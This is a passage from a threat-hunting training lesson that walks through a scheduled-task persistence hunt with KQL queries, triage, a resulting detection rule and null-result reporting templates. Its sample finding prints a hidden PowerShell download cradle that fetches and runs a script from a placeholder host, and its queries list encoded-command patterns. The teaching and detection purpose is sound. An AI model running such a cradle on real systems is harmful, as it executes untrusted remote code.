Two design decisions in that script are worth copying.

**It prints examples with every rare pair.** A count alone is untriageable — you cannot decide whether a pair is interesting without seeing the command line that produced it. **The output format is the hunt.**

**It uses `defaultdict` and `Counter` rather than a database.** For a hunt sized at a few hundred thousand rows, Python's standard library is fast enough and has no installation cost. Reaching for a data warehouse before you have a result to store is a way of not doing the hunt.

```powershell
# HUNT-2026-021 — local sweep on a host you own or are authorised to examine.
# Finds processes currently running from user-writable directories,
# with their parent process and owning account.

$userWritable = @(
    "$env:APPDATA", "$env:LOCALAPPDATA", "$env:TEMP",
    "C:\Users\Public", "C:\ProgramData"
)

Get-CimInstance -ClassName Win32_Process |
    Where-Object {
        $path = $_.ExecutablePath
        $path -and ($userWritable | Where-Object { $path -like "$_*" })
    } |
    ForEach-Object {
        $parent = Get-CimInstance -ClassName Win32_Process -Filter "ProcessId=$($_.ParentProcessId)" `
            -ErrorAction SilentlyContinue
        [PSCustomObject]@{
            PID          = $_.ProcessId
            Name         = $_.Name
            Path         = $_.ExecutablePath
            CommandLine  = $_.CommandLine
            ParentName   = $parent.Name
            ParentPath   = $parent.ExecutablePath
            Owner        = (Invoke-CimMethod -InputObject $_ -MethodName GetOwner).User
            Created      = $_.CreationDate
        }
    } |
    Format-List
```

**The parent lookup is what makes this useful.** A process running from `%LOCALAPPDATA%` is mildly interesting. The same process, when its parent is `explorer.exe` and the user launched it, is a different answer from a parent of `services.exe`. The script resolves the parent by ID in the same pass, so the output carries the relationship.

**Run this only on hosts you own or are authorised to examine.** A process sweep is a read, but it is still access, and the authorisation rules from the cybersecurity roadmap's incident-response phase apply unchanged here.

### Part 6 — One hunt, end to end

#### The scenario

You are a SOC analyst in a mid-sized company with roughly 900 Windows endpoints, a SIEM holding Sysmon, Windows Security events, and an EDR feed, and a proxy log. Your manager has given you three days to hunt, and the shortlist from Part 3 points at persistence. You take **T1053.005 — Scheduled Task**.

#### Step 1 — Hypothesis

```text
HUNT-2026-014 — Scheduled task persistence

Hypothesis
If an adversary established persistence through a scheduled task in the last
90 days, we will see a task whose action invokes a script interpreter
(powershell.exe, cmd.exe, wscript.exe, cscript.exe, mshta.exe, rundll32.exe)
or a binary residing in a user-writable directory, on a host that has no
corresponding change record.

ATT&CK        T1053.005 — Scheduled Task/Job: Scheduled Task
Data needed   Security 4698 (task created), Sysmon 1 (process creation),
              Sysmon 11 (file created), the change-management export
Retention     4698 is in the SIEM at 180 days. Sysmon at 180 days.
Window        90 days, deliberately inside retention
Expectation   Fewer than 40 rows after exclusion of known deployers
```

Two choices in that hypothesis are deliberate.

**The 90-day window is inside the retention boundary**, not on it. That means a zero result is a real zero for the window, and the report can say so without a caveat. Hunting exactly at the retention edge is sometimes necessary, but it weakens every conclusion you draw.

**"No corresponding change record" is part of the hypothesis.** A scheduled task created by the software deployment tool is not a finding, and the hypothesis says so in advance. That decision made before the query is what stops the result set from being a list of everything.

#### Step 2 — Data check, before querying anything

| Field the hunt needs | Source | Available? |
|---|---|---|
| Task name | Security 4698, `TaskName` | Yes |
| Task action — binary and arguments | Security 4698, `TaskContent` | **Not parsed by the connector** |
| Creating account | Security 4698, `SubjectUserName` | Yes |
| Host and time | Security 4698, `Computer`, `TimeGenerated` | Yes |
| Process lineage at creation time | Sysmon 1 | Yes, 180 days |
| Change records | ServiceNow export, CSV | Yes, manual export |

**The second row fails.** `TaskContent` is not being parsed, so the hunt cannot filter on what the task actually runs. This is exactly the situation Part 4 described, and the correct response is not to abandon the hunt but to change it and record why.

**Revised hypothesis, recorded as a change rather than hidden:**

```text
HUNT-2026-014, revision 2 — scope reduced

Original intent  Filter tasks by the action they execute.
Blocked by       TaskContent is not parsed by the 4698 connector.
                 2-hour ingest fix, ticket ING-4471 raised, owner named.
Interim approach Hunt on task NAME patterns (which are parsed) and on
                 process creation on the host within 5 minutes of task
                 creation (Sysmon 1), which recovers most of the missing
                 signal by a different route.
Weakness         A task created from an existing binary with a benign-looking
                 name is invisible to this revision. Stated as a limitation.
```

That block is the single most valuable thing this hunt produced, and it was written before a single query ran.

#### Step 3 — The queries

**Query 1 — every task creation in the window.**

```kql
// HUNT-2026-014, query 1 — task creation, all of it.
let start = ago(90d);
SecurityEvent
| where TimeGenerated > start
| where EventID == 4698
| extend TaskName = tostring(EventData.TaskName)
| extend CreatedBy = tostring(EventData.SubjectUserName)
| project TimeGenerated, Computer, CreatedBy, TaskName
| sort by TimeGenerated desc
```

Run it with no filter first. **A hunt should always start with the population, not with the filter.** You need to know how many tasks are created in 90 days before you can judge whether your filtered result set is small.

Result: **3,914 task creation events across 612 hosts.**

That number is the baseline, and it immediately tells you something: your estate creates roughly 43 scheduled tasks per day. Any hunt that returns "several thousand rows" has told you nothing.

**Query 2 — filter to the names that look like persistence.**

```kql
// HUNT-2026-014, query 2 — task names with patterns common to persistence.
let start = ago(90d);
let namePatterns = dynamic(["updater", "update", "system", "svc", "service",
                            "win", "winlog", "ms", "microsoft", "adobe",
                            "java", "chrome", "temp", "test", "backup"]);
SecurityEvent
| where TimeGenerated > start
| where EventID == 4698
| extend TaskName = tostring(EventData.TaskName)
| extend CreatedBy = tostring(EventData.SubjectUserName)
| extend TaskLeaf = tostring(split(TaskName, "\\")[-1])
| where TaskLeaf has_any (namePatterns)
| project TimeGenerated, Computer, CreatedBy, TaskName
| sort by TimeGenerated desc
```

Result: **418 rows.** Fewer, but still untriageable by hand in a day.

**Query 3 — the join that makes it a hunt.** This is where the interim approach replaces the missing field: look at what *ran* on the host within five minutes of the task being created.

```kql
// HUNT-2026-014, query 3 — task creation joined to process creation
// on the same host inside a 5-minute window. Recovers the missing
// TaskContent signal through process telemetry instead.
let start = ago(90d);
let tasks =
    SecurityEvent
    | where TimeGenerated > start
    | where EventID == 4698
    | extend TaskName = tostring(EventData.TaskName)
    | extend CreatedBy = tostring(EventData.SubjectUserName)
    | extend TaskLeaf = tostring(split(TaskName, "\\")[-1])
    | where TaskLeaf has_any (dynamic(["updater", "update", "system", "svc",
                                       "service", "win", "winlog", "ms",
                                       "temp", "test", "backup"]))
    | project Computer, TaskTime = TimeGenerated, TaskName, CreatedBy;
let procs =
    Event
    | where TimeGenerated > start
    | where Source == "Microsoft-Windows-Sysmon"
    | where EventID == 1
    | extend Image = tostring(EventData.Image)
    | extend CommandLine = tostring(EventData.CommandLine)
    | extend ParentImage = tostring(EventData.ParentImage)
    | project Computer, ProcTime = TimeGenerated, Image, CommandLine, ParentImage;
tasks
| join kind=inner (procs) on Computer
| where ProcTime between (TaskTime .. (TaskTime + 5m))
| project TaskTime, ProcTime, Computer, CreatedBy, TaskName, Image, CommandLine, ParentImage
| sort by TaskTime desc
```

Result: **1,146 rows** — because the join is wide. One task creation on a busy host pulls in every process created in the following five minutes.

**This is the moment most hunts die**, and the honest response is to narrow the join rather than to give up. The narrowing is a hypothesis refinement, not a fudge:

```kql
// HUNT-2026-014, query 4 — narrow to the processes that matter.
// Only script interpreters and only user-writable paths.
let start = ago(90d);
let interpreters = dynamic(["powershell.exe", "pwsh.exe", "cmd.exe",
                            "wscript.exe", "cscript.exe", "mshta.exe",
                            "rundll32.exe", "regsvr32.exe", "installutil.exe"]);
let tasks =
    SecurityEvent
    | where TimeGenerated > start
    | where EventID == 4698
    | extend TaskName = tostring(EventData.TaskName)
    | extend CreatedBy = tostring(EventData.SubjectUserName)
    | project Computer, TaskTime = TimeGenerated, TaskName, CreatedBy;
let interesting =
    Event
    | where TimeGenerated > start
    | where Source == "Microsoft-Windows-Sysmon"
    | where EventID == 1
    | extend Image = tostring(EventData.Image)
    | extend CommandLine = tostring(EventData.CommandLine)
    | extend ParentImage = tostring(EventData.ParentImage)
    | extend Leaf = tolower(tostring(split(Image, "\\")[-1]))
    | where Leaf in~ (interpreters)
        or CommandLine has_any (@"\AppData\", @"\Temp\", @"\ProgramData\",
                                @"\Users\Public\", "-enc", "FromBase64String")
    | project Computer, ProcTime = TimeGenerated, Image, CommandLine, ParentImage;
tasks
| join kind=inner (interesting) on Computer
| where ProcTime between (TaskTime .. (TaskTime + 5m))
| extend SecondsAfter = datetime_diff("second", ProcTime, TaskTime)
| project TaskTime, SecondsAfter, Computer, CreatedBy, TaskName,
          Image, CommandLine, ParentImage
| sort by SecondsAfter asc
```

Result: **62 rows across 34 hosts.**

**Sixty-two rows is a hunt you can finish by hand in an afternoon.** That is what good scoping looks like — not a clever query, but a series of narrowing decisions each of which is written down.

#### Step 4 — Triaging the 62 rows

Not every row needs investigation. Sort them into four buckets before opening anything.

| Bucket | What it looks like | Count | Action |
|---|---|---|---|
| Known deployer | Task name matches the software deployment tool's convention; creating account is the service account | 51 | Exclude, and add to the rule's exclusion set |
| Known admin | Created by a named admin account during business hours, matching a change record | 6 | Exclude with the change record reference |
| Unexplained but benign-looking | A signed binary from `Program Files`, created by a service account | 4 | Note, watch, do not chase |
| **Worth investigating** | A script interpreter or user-writable path, no change record, unusual account | **1** | Investigate |

The one row that mattered:

```text
TaskTime        2026-02-11 03:41:18 UTC
SecondsAfter    1
Computer        WKS-0221
CreatedBy       svc_deploy
TaskName        \Microsoft\Windows\AppManagement\AppUpdateCheck
Image           C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
CommandLine     powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass
                -Command "& { $u='https://cdn-update-check.example.net/p.ps1';
                iwr $u -UseBasicParsing | iex }"
ParentImage     C:\Windows\System32\svchost.exe
```

Investigation findings:

| Question | Answer |
|---|---|
| Is the domain known? | `cdn-update-check.example.net` resolves to a hosting provider, registered 19 days before the task |
| Is the account expected to create tasks? | Yes, `svc_deploy` does — but never at 03:41, and never with a task under the `AppManagement` path |
| Did the host do anything else? | Yes — the same account authenticated to two other hosts in the following hour |
| Is the downloaded content still available? | No — the URL now returns 404 |
| Is there a change record? | No |

**Conclusion: a genuine finding.** The task is a persistence mechanism using a delegated service account, disguised under a Microsoft-looking task path, invoking an encoded-style download cradle one second after the task was registered. Whether the account was compromised or abused, the behaviour is not legitimate.

Recorded as **incident INC-2026-0412**, scoped to three hosts, with the task removed and the account's credentials reset.

#### Step 5 — What was NOT found

The hunt looked for more than the one thing it found. Every one of these is a result, and each one gets a line.

| Searched for | Result | What it means |
|---|---|---|
| Tasks invoking a script interpreter from a user-writable path | 0 of 62 rows | No evidence of the pattern in 90 days |
| Tasks created outside business hours by a human account | 0 | No anomalous human creation |
| Tasks with names impersonating Windows components other than the one found | 1 total | The technique is rare here; a second instance would be notable |
| Tasks on hosts with no EDR agent reporting | **Not answerable** | 12 hosts have no agent; the hunt cannot speak for them |
| Task actions where `TaskContent` would have been decisive | **Not answerable** | The field is unparsed; see ING-4471 |

**The last two rows are the negative results that matter**, because they bound the conclusion. The hunt can say: *in 90 days, across 888 hosts with telemetry, no scheduled-task persistence of this pattern exists other than one confirmed incident — and we cannot speak for 12 hosts or for task content we cannot read.*

#### Step 6 — How the negative result was recorded

```text
HUNT-2026-014 — Scheduled task persistence — CLOSED

Outcome          One confirmed finding (INC-2026-0412), one detection
                 created (DET-233), one telemetry gap raised (ING-4471),
                 one hypothesis retired for the current window.

Positive result  A scheduled task created by svc_deploy on WKS-0221 at
                 03:41 on 2026-02-11 invoked a hidden PowerShell download
                 cradle. Three hosts scoped, tasks removed, credentials
                 reset. Full detail in INC-2026-0412.

Negative results In the 90-day window and across the 888 hosts with
                 telemetry, no other scheduled task matched the pattern of
                 a script interpreter launched from a user-writable path.
                 No task creation by a human account occurred outside
                 business hours.

Boundaries       12 hosts have no EDR agent and are not covered by this
                 conclusion. Task actions could not be filtered directly
                 because Security 4698 TaskContent is unparsed; the hunt
                 used process creation within 5 minutes as a substitute,
                 which would miss a task whose action is a benign binary
                 that later loads a payload.

Follow-ups       DET-233 deployed and monitored for 14 days.
                 ING-4471 to parse TaskContent, owner named, target date set.
                 Agent coverage for the 12 hosts raised with the endpoint team.
                 Technique T1053.005 marked as hunted; next hunt due in 6 months.
```

That is what a null result looks like when it is a result. It states what was searched, what was not found, what the search could not cover, and what changed as a result. **Nothing in it is an apology**, and the four follow-ups are the reason the hunt was worth the hours.

#### The economics of those three days

| Item | Hours |
|---|---|
| Hypothesis and data check | 1.5 |
| Query development and scoping | 3.0 |
| Triaging 62 rows into buckets | 2.5 |
| Investigating the one finding | 2.0 |
| Writing DET-233 | 1.5 |
| Writing the hunt document | 1.5 |
| Total | 12.0 hours |

For twelve analyst hours you produced: one confirmed three-host incident found proactively, one durable detection, one ingest fix that unblocks an entire technique family, one coverage gap raised with the endpoint team, and a retired hypothesis.

**Say that arithmetic out loud in the next budget conversation.** A hunt that produced a detection and an ingest ticket has paid for itself even if the incident had never existed, because DET-233 runs every day forever and ING-4471 makes every future scheduled-task hunt cheaper.

### Part 7 — From finding to durable detection

#### Why a hunt without a detection decays

A hunt is a point-in-time observation. The moment it closes, the estate is no more protected than it was before, unless something permanent changed.

| Hunt output | Half-life |
|---|---|
| A conclusion in a document | Permanent as a document, zero as a control |
| A conclusion with a new detection rule | Permanent as a control, until the rule is tuned away |
| A conclusion with a telemetry gap raised and fixed | Permanent and multiplicative — every future hunt benefits |

**The second row is what most hunts should produce.** Not every hunt — a hunt that confirms coverage is already adequate should produce nothing but a documented confidence statement — but any hunt that finds a behaviour you would want to know about next time must end in a rule.

#### Writing the detection from the hunt query

A hunt query and a detection rule are not the same artefact, and pasting the hunt query into the rule engine is the most common mistake here.

| Hunt query | Detection rule |
|---|---|
| Optimised for completeness in one run | Optimised for precision on every run |
| Wide scope, short life | Narrow scope, permanent |
| Reviewed by the hunter | Reviewed by whoever is on call at 03:00 |
| Triage by the person who wrote it | Triage by anyone |
| May return hundreds of rows | Must return a number a human can handle daily |

Turning HUNT-2026-014's query 4 into DET-233:

```text
DET-233 — Scheduled task creation followed by script interpreter execution

Logic        Security 4698 within 5 minutes of Sysmon 1, same host, where
             the process is a script interpreter or runs from a
             user-writable directory, AND the creating account is not in
             the deployer exclusion list.

Exclusions   svc_deploy (deployment tool, 51 of 62 historical hits)
             Named admin accounts acting on an open change record
             Known software updater paths under Program Files

Expected     Historically this would have fired once in 90 days.
             1 per quarter is the tuning target. Above 1 per week the
             exclusions are wrong.

Severity     Medium, escalating to High when the creating account is a
             service account outside business hours.

Owner        Detection engineering
Review        First review 14 days after deployment, then quarterly.
```

**The "Expected" line is what makes a rule maintainable.** A detection with no expected rate cannot be tuned, because nobody can say whether five alerts a day is normal or a broken exclusion. Write the expected rate into the rule metadata on day one.

#### Tuning, and the difference between tuning and suppression

| Change | What it does | When it is right |
|---|---|---|
| **Add an exclusion for a known-good actor** | Removes a specific documented false positive | When you can name the actor and cite the evidence |
| **Raise the threshold** | Reduces volume by requiring more evidence | When one signal alone is genuinely too weak |
| **Add a correlated condition** | Requires a second signal before alerting | When the pair is far more meaningful than either alone |
| **Disable the rule** | Removes all coverage | Almost never — and never silently |

**The fourth row is the failure mode.** A rule that alerts too often and is disabled in a hurry leaves a gap that nobody records. If a rule must be disabled, the disable is a ticket with an owner and a re-enable date, exactly like any other control change.

**The third row is the one to reach for first.** Almost every noisy detection becomes precise when joined to a second condition that costs an adversary effort. `rundll32.exe` alone is noise. `rundll32.exe` spawned by `winword.exe` is a much sharper signal, and the adversary now has to change two things rather than one.

#### The measurement that keeps a hunting programme honest

| Metric | What it tells you | What it does not |
|---|---|---|
| Hunts completed per month | Whether the programme is running | Whether the hunts were any good |
| Hypotheses retired | Whether the coverage map is advancing | How much risk was reduced |
| Detections created from hunts | Whether hunts are converting into controls | Whether those detections are useful |
| Telemetry gaps closed | Whether the estate is getting more observable | Nothing — this is a pure gain |
| Mean time from hunt close to detection deployed | Whether the handoff works | Nothing |
| **Incidents found by hunting** | A headline number | Nothing about the quiet hunts |

**Report the whole table, not the last row.** A programme that found zero incidents and closed six telemetry gaps had a good quarter, and a report that says only "zero incidents found by hunting" has hidden every real result it produced.

### Part 8 — Reporting a hunt that found nothing

#### Why the null result is the hard part

A hunt that found an intrusion has a story. A hunt that found nothing has a document, and the document has to answer a question nobody asked out loud: *was this worth the twelve hours?*

The answer is yes, when the document is written properly, and the way to write it properly is to answer four questions in order.

| Question | Where it goes in the document |
|---|---|
| What did you expect to see? | The hypothesis section, written before the hunt |
| Could your data have shown it? | The data and limitations section |
| What did you actually search? | The queries, verbatim |
| What does the negative result mean? | The conclusion, with its boundary stated |

**The second question is the one that separates a real negative result from a hollow one.** "We searched for X and found nothing" is only meaningful if the data would have shown X. If the field was unparsed, or the retention was four days, or twelve hosts were unmonitored, then the honest sentence is different, and it is more useful.

#### Three phrasings, and which one is honest

| Phrasing | Is it true? | When it is acceptable |
|---|---|---|
| "No evidence of X found in the estate" | Only if coverage is complete | Almost never — say the boundary |
| "No evidence of X found across the 888 hosts with telemetry, in the 90 days retained" | Yes, and precise | The normal, correct phrasing |
| "No X present" | No — this is an unfalsifiable claim | Never |

The third phrasing is the one to avoid absolutely. **You cannot prove a negative**, and a report that claims to is a report nobody should trust. The second phrasing is defensible, checkable, and just as reassuring — because a manager reading "888 hosts, 90 days, telemetry confirmed" gets a real answer, while a manager reading "no X present" gets a claim they cannot verify.

#### The one-page null-result template

```text
HUNT-2026-018 — Credential access via LSASS memory read — CLOSED, NEGATIVE

Hypothesis      If an adversary read credential material from LSASS memory
                on our Windows estate in the last 60 days, we would see a
                process opening lsass.exe with memory-read access rights,
                where the accessing process is neither the EDR agent nor a
                known backup product.

ATT&CK          T1003.001 — OS Credential Dumping: LSASS Memory

Data check      EDR process events include access-right detail. 60 days
                requested, 60 days available. Coverage: 888 of 900 hosts.
                PASS — the hypothesis is answerable.

Search          Query run against DeviceEvents for 60 days, filtered to
                lsass.exe as target and to memory-read access masks.
                4,118 raw rows; 34 after exclusion of the EDR agent and
                the two documented backup products.

Result          NEGATIVE. All 34 remaining rows were attributed to
                Microsoft Defender for Endpoint's own credential-guard
                telemetry and to a monitoring agent whose service account
                was not in the exclusion list at the time of the hunt.
                Both attributions were verified by signature and by
                confirming the process path under Program Files.

Boundary        The conclusion covers 888 hosts and 60 days. It does not
                cover 12 hosts with no agent, and it does not cover the
                period before agent deployment. It cannot speak to
                credential access that does not read memory — for example
                a keylogger or a registry-based secret.

Action taken    1. Monitoring agent service account added to the
                   exclusion list, with a comment explaining why.
                2. 12 unmonitored hosts raised with the endpoint team;
                   ticket EPD-2210 opened.
                3. T1003.001 marked HUNTED in the coverage map; next
                   hunt due in 6 months.
                4. No new detection created — DET-094 already covers the
                   behaviour and is confirmed working by this hunt.

Hours           9.5 analyst hours over 2 days.
```

**Point 4 is a result too.** The hunt confirmed an existing detection works, which is a different kind of value from finding something new, and it is worth stating because it is the evidence you would need if someone later proposed removing that rule.

**Point 1 is the value that is easiest to miss.** Adding a service account to an exclusion list is trivial work, and it removed 3,900 false-positive rows from every future run of that hunt.

#### Telling a manager about a null result

Three sentences, in this order, and no apologising.

```text
I spent 9.5 hours hunting credential dumping across 888 hosts and 60 days.
I found nothing malicious, and I can now say that with confidence because
the data covers the behaviour and I verified every hit by hand.

The hunt did produce four changes: an exclusion list fix that removes
about 3,900 false positives from future runs, a ticket for the 12 hosts
we cannot see, a confirmed-working detection, and a technique marked as
covered until the next hunt in six months.
```

**The second paragraph is the one that gets the next hunt approved.** A null result presented as "I found nothing" invites the question "then why did you do it". The same null result presented with four concrete changes answers that question before it is asked.

#### When a hunt should be stopped early

Not every hunt deserves its full time box. Three signals mean stop and write up what you have.

| Signal | What it means | What to do |
|---|---|---|
| The data cannot answer the question at the required fidelity | The hunt is unanswerable, not hard | Stop, write the gap, raise the ticket |
| The result set cannot be narrowed below four figures | The hypothesis is too broad | Stop, rewrite the hypothesis, restart in the next cycle |
| Two days in, no query has produced a single reviewable row | Usually a data problem, not a quiet estate | Stop, verify the data with a known-positive test |

**The third signal has a specific test.** Before concluding that the estate is clean, prove the query works by running it against a known-positive: a synthetic event you generate yourself, or a documented past incident. A query that returns zero because the field name is wrong and a query that returns zero because nothing happened produce identical output. **Only one of them is a finding.**

### Key takeaways

- **Hunting is the only security activity whose purpose is to look where no rule points.** Everything else in your queue is somebody else's past question.
- **The absence of a signal is not evidence of the absence of activity.** An empty queue and a broken pipeline look identical, and telling them apart is a skill.
- **A hypothesis must be falsifiable.** If nothing could disprove it, no query can answer it, and it is not worth a week.
- **Write the plan before the query.** Behaviour, data source, window, scope, expectation, and disconfirming evidence — six fields, ten minutes.
- **Never hunt beyond your retention window without saying so.** A negative result from before the retention boundary is meaningless rather than reassuring.
- **Data that exists is not data that answers.** A process event without a command line cannot tell `rundll32` from `rundll32 evil.dll`, and the gap belongs in the report.
- **The tool-first hunt is the failure mode to name.** Starting from a query and looking for a reason to run it produces a log entry, not a result.
- **Start with the population, then narrow.** Three thousand rows tells you the estate's baseline; sixty-two rows is a hunt you can finish.
- **A join without a time bound is a false-positive generator.** Process IDs are recycled.
- **Prove your query against a known-positive before concluding the estate is clean.** A wrong field name and a quiet estate produce identical output.
- **Turn a finding into a rule, a retired hypothesis, or a closed data gap.** A hunt that ends in a document ends when you change jobs.
- **A detection with no documented expected rate cannot be tuned**, because nobody can tell normal from broken.
- **The negative result is the hard part, and the boundary sentence is what makes it honest.** "888 hosts, 90 days" is checkable; "not present" is a claim nobody should make.
- **Measure the whole table, not the incident count.** A quarter that closed six telemetry gaps was a good quarter.
- **Report the hours and the changes together.** Twelve hours for a detection, an ingest fix, and a confirmed incident is a good trade, and saying so plainly is what keeps the programme funded.

### Practice this next

The ten tasks build toward one artefact — a hunt document with a real hypothesis, real queries, and an honest conclusion — and the order follows the method deliberately.

1. **Build the data-source inventory** (task 1) before anything else: every log you can reach, its key fields, its retention, and its fidelity. Write the shortest retention window down. That number is your estate's investigative memory.
2. **Write three hypotheses and throw two away** (task 2). Use the six-field form. The one you keep should be the one where you can state what would disprove it.
3. **Test one hypothesis against a known-positive** (task 3) before trusting a negative. Generate a synthetic event or replay a documented past incident, and confirm your query would have caught it.
4. **Answer a coverage question with the ATT&CK table** (task 4): pick three techniques you suspect are invisible, and write down the data source that would reveal each one. That list is a quarter's worth of work.
5. **Convert one hypothesis across three query languages** (task 5): KQL, SPL, and Sigma. The translation is where you find out whether you understood the logic or just memorised the syntax.
6. **Run a rarity hunt with no threat intelligence at all** (task 6). Use the `rare` search from Part 5, or its KQL equivalent, and triage the top hundred parent-child pairs. This is the cheapest hunt in the lesson and it surprises people.
7. **Write a YARA rule and sweep a folder you own** (task 7). Tune it until it returns a handful of files rather than thousands or none. Hunting YARA is a filter, not a verdict.
8. **Run the full hunt** (task 8) using the Part 6 structure: hypothesis, data check, queries, triage buckets, positive result, negative results, boundaries, follow-ups. Aim for a hypothesis that is genuinely open — one where you do not already know the answer.
9. **Convert the finding into a detection** (task 9), with an expected rate, an exclusion set, an owner, and a review date written into the rule. Then run a second, deliberately negative hunt and write it up using the null-result template.
10. **Write the one-paragraph business summary** (task 10) for both hunts — the hit and the miss — in the three-sentence form. Rehearse it out loud. This is the paragraph that decides whether you get the next time box.

Then open `portfolio/advance/02-threat-hunting.md` and assemble the deliverables. **The phase is done when you can plan a hunt, run it, and write up both what you found and what you did not** — with the boundary of the conclusion stated, and the result converted into something that outlives the hunt.

## Tools for This Phase

| Tool | What it does | Cost | Official link | Mini-task | Free alternative |
|---|---|---|---|---|---|
| Microsoft Sentinel / Defender XDR | KQL hunting over cloud and endpoint telemetry | Freemium | https://learn.microsoft.com/en-us/azure/sentinel/ | Run a 30-day hunt over `DeviceProcessEvents` for proxy execution | Elastic Security, or Splunk Free |
| Splunk Free | SPL search over indexed logs | Free | https://www.splunk.com/en_us/download/splunk-enterprise.html | Index Sysmon logs and run the `rare` parent-child search | Elastic Stack or OpenSearch |
| Sigma | Vendor-neutral detection rule format | Free/open-source | https://sigmahq.io/ | Write one rule with a `logsource` and a two-clause `condition` | Manual query in each SIEM's own language |
| sigma-cli | Converts Sigma rules to vendor query languages | Free/open-source | https://github.com/SigmaHQ/sigma-cli | Convert one rule to Splunk SPL and compare it to your hand-written query | sigma-pySigma backends used directly |
| YARA | Pattern matching over files and memory images | Free/open-source | https://virustotal.github.io/yara/ | Write a rule with an MZ anchor and scan a folder you own | ClamAV signatures, or grep on strings |
| Velociraptor | Endpoint DFIR and hunting across many hosts | Free/open-source | https://docs.velociraptor.app/ | Run a VQL artefact collecting autoruns and listening ports | osquery, or a PowerShell sweep |
| osquery | SQL-ified endpoint telemetry | Free/open-source | https://osquery.io/ | Join `processes` to `listening_ports` and sort by name | `Get-CimInstance` in PowerShell |
| ATT&CK Navigator | Maps technique coverage as a layer | Free | https://mitre-attack.github.io/attack-navigator/ | Build a layer marking covered, visible, and blind techniques | A spreadsheet with the same four columns |
| Atomic Red Team | Executable technique tests to generate telemetry | Free/open-source | https://github.com/redcanaryco/atomic-red-team | Run one atomic test in an isolated lab VM and hunt its output | OTRF Security Datasets |
| OTRF Security Datasets | Pre-recorded attack telemetry to hunt against | Free/open-source | https://github.com/OTRF/Security-Datasets | Replay one dataset locally and hunt it end to end | Atomic Red Team with your own logging |

## Free/cheap resources

- MITRE ATT&CK — https://attack.mitre.org/
- MITRE ATT&CK Navigator — https://mitre-attack.github.io/attack-navigator/
- SigmaHQ rule repository — https://github.com/SigmaHQ/sigma
- Sigma documentation — https://sigmahq.io/docs/guide/getting-started.html
- YARA documentation — https://yara.readthedocs.io/
- KQL quick reference — https://learn.microsoft.com/en-us/azure/data-explorer/kusto/query/kql-quick-reference
- Splunk Search Reference — https://docs.splunk.com/Documentation/Splunk/latest/SearchReference
- Velociraptor documentation — https://docs.velociraptor.app/docs/
- osquery documentation — https://osquery.readthedocs.io/
- The DFIR Report — https://thedfirreport.com/
- OTRF Security Datasets — https://github.com/OTRF/Security-Datasets
- Atomic Red Team — https://github.com/redcanaryco/atomic-red-team
- Elastic detection rules — https://github.com/elastic/detection-rules
- Microsoft Sentinel hunting queries — https://github.com/Azure/Azure-Sentinel
- Red Canary Threat Detection Report — https://redcanary.com/threat-detection-report/
- David Bianco, The Pyramid of Pain — https://detect-respond.blogspot.com/2013/03/the-pyramid-of-pain.html

## Hands-on practice tasks

1. Build a data-source inventory covering every log you can reach, with key fields, retention, and fidelity, and note the shortest retention window. <!-- id: advance-02-t01 band: deep energy: high -->
2. Write three hunt hypotheses in the six-field form, then keep only the one you can state disconfirming evidence for. <!-- id: advance-02-t02 band: focused energy: normal -->
3. Test one query against a known-positive event you generate yourself, and confirm it would have detected the behaviour. <!-- id: advance-02-t03 band: focused energy: normal -->
4. Mark three techniques as covered, visible, or blind in an ATT&CK layer, and name the data source each blind one needs. <!-- id: advance-02-t04 band: focused energy: normal -->
5. Express one hypothesis in KQL, SPL, and Sigma, and note every place the three translations disagree. <!-- id: advance-02-t05 band: deep energy: high -->
6. Run a rarity hunt on parent-child process pairs and triage the top hundred results into exclude, note, and investigate. <!-- id: advance-02-t06 band: focused energy: normal -->
7. Write a YARA rule for a behaviour rather than a hash, and tune it until it returns a reviewable number of files. <!-- id: advance-02-t07 band: focused energy: normal -->
8. Run one full hunt end to end using the Part 6 structure, including the data check and the negative results table. <!-- id: advance-02-t08 band: deep energy: high -->
9. Convert your hunt finding into a detection rule with an expected rate, an exclusion set, an owner, and a review date. <!-- id: advance-02-t09 band: deep energy: high -->
10. Write a null-result hunt document using the one-page template, including the boundary sentence and the follow-up actions. <!-- id: advance-02-t10 band: quick energy: low -->
11. Write the three-sentence business summary for both your hit hunt and your miss hunt, and say it out loud without notes. <!-- id: advance-02-t11 band: quick energy: low -->
12. Check the retention of your three shortest-lived log sources and write down what question each one can no longer answer. <!-- id: advance-02-t12 band: quick energy: low -->

## Deliverable / proof of work

Create `portfolio/advance/02-threat-hunting.md` with:

- A data-source inventory naming key fields, retention, and fidelity for every log you can reach
- One hunt plan in the six-field form, including the falsifiability statement and the retention check
- The queries you ran, verbatim, in at least two query languages
- A known-positive test proving your query would have detected the behaviour
- A triage table sorting your result set into exclude, note, and investigate buckets
- One full hunt write-up with positive results, negative results, and stated boundaries
- One null-result hunt write-up using the one-page template, including the boundary sentence
- A detection rule derived from a hunt finding, with an expected rate and a named owner
- One telemetry gap with the specific missing field, the fix, the cost, the owner, and the ticket reference
- An ATT&CK layer or table marking techniques as covered, visible, or blind
- The hours spent on each hunt, and the list of changes each one produced

## Checklist

- [ ] I can explain the difference between monitoring, triage, and hunting, and why the failure modes differ. <!-- id: advance-02-hunting-vs-monitoring energy: low -->
- [ ] I wrote a hypothesis with named data sources, a window, a scope, and disconfirming evidence. <!-- id: advance-02-hypothesis-written energy: normal -->
- [ ] I built a data-source inventory naming retention and fidelity for each source. <!-- id: advance-02-data-source-inventory energy: normal -->
- [ ] I checked retention before hunting, and stated the boundary in the conclusion. <!-- id: advance-02-retention-check energy: low -->
- [ ] I proved my query works against a known-positive before trusting a negative. <!-- id: advance-02-known-positive-test energy: normal -->
- [ ] I expressed one hypothesis in KQL, SPL, and Sigma, and explained where they differ. <!-- id: advance-02-query-translation energy: normal -->
- [ ] I ran a rarity or baseline hunt that required no threat intelligence. <!-- id: advance-02-rarity-hunt energy: normal -->
- [ ] I wrote a YARA rule that matches behaviour and tuned it to a reviewable hit count. <!-- id: advance-02-yara-rule energy: normal -->
- [ ] I ran one full hunt end to end and recorded the hours it cost. <!-- id: advance-02-full-hunt energy: high -->
- [ ] I documented what I did not find, and the boundary of that conclusion. <!-- id: advance-02-negative-result energy: normal -->
- [ ] I turned a hunt finding into a detection rule with an expected rate and an owner. <!-- id: advance-02-finding-to-detection energy: high -->
- [ ] I raised a telemetry gap with the missing field, the fix, the owner, and a ticket reference. <!-- id: advance-02-telemetry-gap energy: normal -->
- [ ] I mapped at least three techniques as covered, visible, or blind in an ATT&CK layer. <!-- id: advance-02-attack-coverage energy: normal -->
